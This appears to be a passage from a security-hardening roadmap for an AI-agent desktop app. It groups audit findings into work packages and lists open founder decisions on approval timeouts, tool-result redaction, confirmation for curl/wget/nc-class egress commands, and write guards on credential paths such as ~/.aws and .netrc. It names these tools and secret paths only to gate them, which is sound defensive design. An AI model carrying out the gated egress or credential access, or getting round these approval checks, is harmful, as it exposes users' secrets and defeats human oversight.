4. **P4 — Egress, secrets and redaction seams** (Themes 6, 7, 8): OC02-C1 (+OC10-C1, OC13-C1, OCC01-C1, OC19-C11, OC19-M1, HM10-M3, OC22-C12), OC02-C7, OC04-C7, OC10-M6, OC13-M2, HM08-C8, OC10-C2, OC12-C8, OC12-M2, OC22-C6, OC12-M4, HM15-C13, OC19-C6, OC07-C7, OC12-C3, OC24-C5, OC04-C6, OC12-C1, OC19-C2, HM16-C13, OC14-C3, OC24-M3, HM12-M4, OC16-C11, OC23-C20, OC19-M5, OC16-C9, OC09-M5, OC06-M2, OC06-M3, OC13-C2, HM12-C1, OC12-M3, HM04-C14 (+C17), plus A03-G1/G2/G4/G5/G6 and riders, A04-G4, A05-G1/G2/G5/G9/G10. Prerequisites: none for the guard; the 05-C decision for the executor result seam. Hot files: `agents/state_machine.py` (truncation, `_tee_publish`), `dashboard/routes/agent.py` (`GET /agent/timeline`), `tools/executor.py` (log lines). Founder decisions: F-A4, F-A5, F-A7. ROADMAP: TRUST-1, SEC-15, MCP-1.
5. **P5 — Third-party process boundary and file-path primitives** (Theme 5 plus the file-read/write guards): HM09-C4 (+A17-G1), OC02-C6, OC05-M5, OC22-M2, HM09-C5, HM09-C6, HM09-C3, HM17-C1, OC06-C2, HM17-M1, OC17-M2, OC02-M1 (+OC10-M1), HM07-C2, OC10-M4, HM12-M1 (+A17-G10), and the file-path items OCC01-C2, OC01-C7, OCC01-M3, OC10-M2, OC10-C12, OC10-M3, HM17-C8, HM07-C10, HM07-C11, OC15-C9, HM17-C3, plus A17-G2/G3/G5/G7/G8. Note: OCC01-C2/OC01-C7/OCC01-M3 all edit `ToolExecutor._read_file` (sensitive-pattern gate; fd-pinned bounded read; windowed reads with binary/directory detection) and HM17-C8/HM07-C10/HM07-C11/OC15-C9/HM17-C3 all edit `_classify_write`/`_write_file` (resolve before matching; credential FILE names; always-ask on instruction files on both literal and realpath; `~/.aws`/`.netrc`/`.docker`/docker.sock; post-write content warnings) — one owner for each function. Prerequisites: none; B6 (the MCP server audit) runs alongside and owns `mcp/server.py`. Hot files: `tools/executor.py`. Founder decisions: F-A8, F-A4. ROADMAP: MCP-1, TRUST-1.
6. **P6 — The door, the OS-grant axis, doctor/lint and the security documents** (Themes 10, 11, 12, 13): OC24-C1, OC24-M1, OC16-C1, OC02-C10, OC19-M4, HM12-M2, OC13-M5, OC13-M4, OC16-C10, OC16-C12, OC22-M3, OC04-C5, OC16-M3, OC16-M4, OC02-M4, OC22-C1, OC22-C2, HM14-C2, HM14-C3, HM14-M3, OC12-C7, OC17-C8, OC19-C1, OC12-C14, OC19-M6, OC17-C7/C9/C14/C12, OC17-M4, OC17-M5, OC19-C4, OC19-M3, OC24-M4, HM14-M2, OC09-M2, HM14-C8, OC19-C5, OCC01-M2, HM19-C7, OC24-C3, OC24-M5, HM20-C5, OC06-M1 (+OC02-M2), OC09-M3, HM12-M3, OC16-M2, HM14-M1, OC09-M4, OC01-M7, OC10-M8, OC06-M6, OC01-M6, HM17-M2, OC02-M3, OC01-C11, OC10-M7, OC10-M5, and the Theme 13 rows HM10-C6, HM05-C2/C14/C3, OC22-M6, OC09-C9, OC10-C7, OC05-C9, OCC01-M4. Prerequisites: P5's trusted-bin resolver for the `lsof`/`scutil`/`codesign` calls. Hot files: `dashboard/app.py` (CSP middleware, body cap, shutdown budget), `agents/conversation_sqlite.py` (read for the FTS/WAL rows). Founder decisions: F-A3, F-A11. ROADMAP: TRUST-1, SHELL-1, APPLE-1, DOCS-1, LD-1.

Handoffs: OC09-M3, OC06-M1, HM12-M3, OC16-M2 and HM14-M1 are better owned by the scheduler-heartbeat-daemon-watchdog section if it already carries them; HM17-M2 by HOME-1; HM10-M2/M5 by SKILL-1. They are counted here so nothing is dropped.

### Open founder decisions

- **F-A1 — Approval timeout default.** "Should every approval request expire, denied, after a bounded default (say 30 minutes), with `mode='auto'` deleted?" Recommend yes: expired == denied, `auto` removed, unattended runs refused up front with a named reason. The consent lattice already honours expiry; the legacy engine is the outlier.
- **F-A2 — D3-P5 review scheduling.** "May the `assert_not_governed` wiring at the six named write sites, plus the config-key denylist, go through the REVIEW-GATED D3-P5 pass now?" Recommend scheduling the review immediately; the fence exists, is tested, and has zero callers.
- **F-A3 — Signing identity.** "Set a real `signingIdentity` in `tauri.conf.json` (Developer ID, or ad-hoc but identifier-pinned) so TCC grants survive rebuilds?" Recommend yes; until then every OS-grant reads UNDETERMINED by construction.
- **F-A4 — LAN local providers.** "Is Ollama/LM Studio on another LAN machine a supported configuration?" Recommend: yes, but only via an explicit allowed-host list; the caller body must never select the local-provider branch, and `trust_env=False` on all local-model sessions.
- **F-A5 — Sealed secrets.** "Build the AES-GCM sentinel sealing layer (OC12-C1), or stop at registry feeding + SecretRef over the custody ladder?" Recommend deferring sealing until `execute_code` or an outbound tool needs a credential in-process; ship OC12-M2 and the SecretRef work first.
- **F-A6 — Durable undo.** "Is undo of the machine's own edits a durable promise (persisted, retention-capped) or a within-one-action safety net?" Recommend durable with a size ceiling, per "leave old data unread, never delete".
- **F-A7 — The parked 05-C question.** "Do internal (non-MCP) tool results route through `redact_result` at the executor's result seam?" Recommend yes — `write_config`'s diff, provider error bodies and script stdout all leak today; cost is one call.
- **F-A8 — OSV preflight switch.** "Expose an opt-in Settings switch that sends package names to OSV before the first spawn of an npx/uvx MCP server?" Recommend yes as opt-in, default off (it is a network egress).
- **F-A9 — Network-egress binaries.** "Do curl/wget/nc-class commands classify HIGH (confirm) rather than MEDIUM (run unattended)?" Recommend HIGH; this settles the concrete half of the open "todo D1".
- **F-A10 — Standing allow-rules.** "Will Halbert ever offer 'don't ask again' for a shell command?" Recommend: only bound to a digest over normalised argv + cwd, and only after OCC02-C2's deterministic prefix/injection check; never keyed to a name.
- **F-A11 — SECURITY.md boundary statement.** "Publish that the host OS user-account boundary is the only load-bearing one and that the lattice, echo guard, registry and ledger are heuristics with named defeats?" Recommend yes; it is the reviewer-defensible bar stated once.
- **F-A12 — Retention of the machine's own work history.** "May the stuck-work audit prune old records on a window, or report only?" Recommend report only, per the standing directive.
